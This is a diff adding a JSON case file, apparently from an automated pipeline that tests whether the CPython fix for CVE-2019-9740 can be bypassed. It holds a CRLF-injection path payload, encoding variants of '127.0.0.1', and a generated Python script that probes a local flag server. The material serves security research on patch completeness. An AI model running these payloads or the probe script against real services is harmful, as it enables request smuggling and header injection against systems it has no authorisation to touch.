@@ -1,0 +1,282 @@
+{
+  "case_dir": "PCBV2-0016",
+  "a_paper_version": "1.0",
+  "k_limit": 8,
+  "n_limit": 4,
+  "status": "candidates_ready",
+  "P": {
+    "methods": [
+      "print",
+      "json.dumps",
+      "candidate"
+    ],
+    "paths": [
+      "/x\\r\\nGET flag HTTP/1.1"
+    ],
+    "params": [
+      "id",
+      "mode",
+      "host",
+      "path",
+      "indent"
+    ],
+    "dangerous_spans": [
+      "127.0.0.1",
+      "/x\\r\\nGET flag HTTP/1.1"
+    ],
+    "assert_literals": [],
+    "all_string_literals": [
+      "[GIVEN] CVE-2019-9740 seed exploit for the CPython stdlib http.client CRLF guard.\n\nClassic CRLF injection in the request PATH/query (the first argument to\nurllib.request.urlopen / the `url` of http.client putrequest). The path carries a\nCRLF that splits off a second line on the wire:\n\n    path = \"/x\\\\r\\\\nGET flag HTTP/1.1\"\n\nOn V0 (python 3.7.3) `putrequest` writes the request line raw (no `_validate_path`),\nso the smuggled `GET flag` inline command reaches the internal line-based flag\nlistener and it returns ${PCB_FLAG} (REACHES). On V1 (python 3.7.7, the\nCVE-2019-9740 fix) `putrequest` calls `_validate_path(url)`, whose regex\n`_contains_disallowed_url_pchar_re = [\\\\x00-\\\\x20\\\\x7f]` matches the CR/LF and raises\n`InvalidURL` -- nothing is sent (BLOCKED). The block on V1 is specifically the path\nvalidation the CVE-2019-9740 fix added; it does NOT cover the host component, which\nis exactly what the CVE-2019-18348 residual (see _heldout/bypass_poc.py) exploits.\n",
+      "id",
+      "cve-2019-9740-path-crlf",
+      "mode",
+      "seed",
+      "host",
+      "127.0.0.1",
+      "path",
+      "/x\\r\\nGET flag HTTP/1.1",
+      "__main__"
+    ]
+  },
+  "O": {
+    "added_comparison_literals": [],
+    "removed_comparison_literals": [],
+    "new_calls": [
+      {
+        "name": "InvalidURL",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "match.group",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "re.compile",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "chr",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "list",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "range",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "replace",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "repr",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "resp.geturl",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.assertNotIn",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.assertRaisesRegex",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.fakehttp",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.unfakehttp",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "unittest.skipUnless",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "urllib.request.urlopen",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "urlopen",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "conn.send",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "name": "encode",
+        "file": "Lib/test/test_xmlrpc.py"
+      }
+    ],
+    "changed_functions": [],
+    "new_string_constants": [
+      {
+        "value": "[\\x00-\\x20\\x7f]",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "\\x00",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "URL can't contain control characters. ",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "(found at least ",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": ")",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "ssl module required",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "//localhost:7777/test",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "/",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "HTTP/1.1 200 OK\\r\\n\\r\\nHello.",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\r",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\\\",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "r'\\\\'",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "http:",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "https:",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "localhost:7777?a=1 HTTP/1.1\\r\\nX-injected: header\\r\\nTEST: 123",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "//",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": ":8080/test/?test=a",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*\\\\r.*(found at least . .)",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*\\\\n",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\n",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "POST /RPC2 HTTP/1.0\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "\\r",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Content-Length: 100\\r\\n\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "bye HTTP/1.1\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Host: ",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": ":",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Accept-Encoding: identity\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Content-Length: 0\\r\\n\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "ascii",
+        "file": "Lib/test/test_xmlrpc.py"
+      }
+    ],
+    "new_regex_patterns": [],
+    "files_touched": [
+      "Lib/http/client.py",
+      "Lib/test/test_urllib.py",
+      "Lib/test/test_xmlrpc.py"
+    ],
+    "is_empty": false
+  },
+  "D": {
+    "skipped": "no source_dir provided"
+  },
+  "a_paper_candidates": 122,
+  "a_code_candidates": 29,
+  "siblings": [],
+  "sibling_count": 0,
+  "candidate_summary": {
+    "a_paper_count": 122,
+    "a_code_count": 29,
+    "sibling_count": 0,
+    "total": 151,
+    "a_paper_families": [
+      "slash",
+      "overlong",
+      "dot",
+      "ws",
+      "null",
+      "case",
+      "backslash",
+      "percent",
+      "unicode",
+      "html",
+      "double"
+    ],
+    "a_paper_version": "1.0"
+  },
+  "graph_connectivity": {
+    "entry_to_sink_connected": false,
+    "reason": "no tool graph"
+  },
+  "test_template": "\"\"\"Residual test: auto-generated by static pipeline.\n\nPath: /x\\r\\nGET flag HTTP/1.1\nMethod: GET\nO obligations: []\nO removed: []\nN limit: 4\nA_paper version: 1.0\n\"\"\"\n\nimport os\nimport sys\nimport json\nimport urllib.request\nimport urllib.error\n\nBASE_URL = os.environ.get(\"BASE_URL\", \"http://localhost:8080\")\nMARKER = os.environ.get(\"MARKER\", \"\")\nMAX_ATTEMPTS = 4\n\n# Obligation set from AST diff\nO_ADDED = []\nO_REMOVED = []\n\n# A_paper candidates (encoding families on dangerous spans)\nA_PAPER = [\n    \"%31%32%37%2E%30%2E%30%2E%31\",  # percent-full\n    \"%2531%2532%2537%252E%2530%252E%2530%252E%2531\",  # double-percent-full\n    \"&#49;&#50;&#55;&#46;&#48;&#46;&#48;&#46;&#49;\",  # html-numeric-full\n    \"127%2E0.0.1\",  # percent@3\n    \"127%252E0.0.1\",  # double-percent@3\n    \"127%C0%AE0.0.1\",  # overlong-utf8-2@3\n    \"127%E0%80%AE0.0.1\",  # overlong-utf8-3@3\n    \"127\\\\u002E0.0.1\",  # unicode-escape@3\n    \"127&#46;0.0.1\",  # html-numeric@3\n    \"127&#x2E;0.0.1\",  # html-hex@3\n    \"127\\\\x2E0.0.1\",  # backslash@3\n    \"127.0%2E0.1\",  # percent@5\n]\n\n# A_code candidates (source literals)\nA_CODE = [\n    \"[\\\\x00-\\\\x20\\\\x7f]\",  # O:new_string:Lib/http/client.py\n    \"\\\\x00\",  # O:new_string:Lib/http/client.py\n    \"URL can't contain control characters. \",  # O:new_string:Lib/http/client.py\n    \"(found at least \",  # O:new_string:Lib/http/client.py\n    \")\",  # O:new_string:Lib/http/client.py\n    \"ssl module required\",  # O:new_string:Lib/test/test_urllib.py\n    \"//localhost:7777/test\",  # O:new_string:Lib/test/test_urllib.py\n    \"/\",  # O:new_string:Lib/test/test_urllib.py\n    \"HTTP/1.1 200 OK\\\\r\\\\n\\\\r\\\\nHello.\",  # O:new_string:Lib/test/test_urllib.py\n    \"\\\\r\",  # O:new_string:Lib/test/test_urllib.py\n    \"\\\\\\\\\",  # O:new_string:Lib/test/test_urllib.py\n    \"r'\\\\\\\\'\",  # O:new_string:Lib/test/test_urllib.py\n]\n\nSIBLINGS = []\n\n\ndef probe(candidate_value: str) -> dict:\n    \"\"\"Send a black-box probe to V1 via GET /x\\r\\nGET flag HTTP/1.1.\"\"\"\n    url = BASE_URL.rstrip(\"/\") + candidate_value\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"residual-test/1.0\")\n    try:\n        with urllib.request.urlopen(req, timeout=10) as resp:\n            body = resp.read().decode(\"utf-8\", errors=\"replace\")\n            headers = dict(resp.headers)\n            return {\"status\": resp.status, \"body\": body, \"headers\": headers}\n    except urllib.error.HTTPError as e:\n        body = e.read().decode(\"utf-8\", errors=\"replace\") if e.fp else \"\"\n        return {\"status\": e.code, \"body\": body, \"headers\": dict(e.headers)}\n    except Exception as e:\n        return {\"status\": \"error\", \"body\": str(e), \"headers\": {}}\n\n\ndef check_effect(response: dict) -> dict:\n    \"\"\"Check if the external effect marker appears in response.\"\"\"\n    body = response.get(\"body\", \"\")\n    headers = response.get(\"headers\", {})\n    \n    # Check body for marker\n    if MARKER and MARKER in body:\n        return {\"found\": True, \"location\": \"body\", \"marker\": MARKER}\n    \n    # Check headers for marker\n    for hname, hval in headers.items():\n        if MARKER and MARKER in str(hval):\n            return {\"found\": True, \"location\": f\"header:{hname}\", \"marker\": MARKER}\n    \n    return {\"found\": False}\n\n\ndef run():\n    \"\"\"Run candidates against V1, up to N attempts.\"\"\"\n    witnesses = []\n    attempts = 0\n    \n    all_candidates = []\n    for c in A_PAPER:\n        all_candidates.append((\"a_paper\", c))\n    for c in A_CODE:\n        all_candidates.append((\"a_code\", c))\n    for c in SIBLINGS:\n        all_candidates.append((\"sibling\", c))\n    \n    for source, candidate in all_candidates:\n        if attempts >= MAX_ATTEMPTS:\n            break\n        \n        attempts += 1\n        resp = probe(candidate)\n        effect = check_effect(resp)\n        \n        result = {\n            \"candidate\": candidate,\n            \"source\": source,\n            \"status\": resp[\"status\"],\n            \"effect\": effect,\n        }\n        \n        if effect.get(\"found\"):\n            # Check obligation binding\n            bound_o = None\n            for o_lit in O_ADDED + O_REMOVED:\n                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):\n                    bound_o = o_lit\n                    break\n            result[\"obligation_binding\"] = bound_o\n            result[\"verdict\"] = \"witness\" if bound_o else \"effect_only\"\n            witnesses.append(result)\n        else:\n            result[\"verdict\"] = \"no_effect\"\n    \n    return {\n        \"attempts\": attempts,\n        \"witnesses\": witnesses,\n        \"total_candidates\": len(all_candidates),\n    }\n\n\nif __name__ == \"__main__\":\n    if not MARKER:\n        print(\"Warning: MARKER not set\", file=sys.stderr)\n    result = run()\n    print(json.dumps(result, indent=2))\n",
+  "elapsed_s": 0.0
+}
